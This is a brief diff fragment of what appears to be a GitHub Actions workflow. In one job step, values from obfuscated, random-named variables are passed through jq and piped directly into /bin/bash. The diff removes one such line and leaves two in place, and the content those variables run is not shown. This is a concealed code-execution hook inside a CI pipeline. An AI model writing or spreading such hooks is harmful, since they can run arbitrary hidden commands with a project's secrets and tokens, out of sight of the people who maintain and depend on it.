@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$zp29209" | jq -r .reyi717 | /bin/bash
           echo $oht0 | jq -r .kumm76552 | /bin/bash
-          echo $cgvaj0365 | jq -r .b0998 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
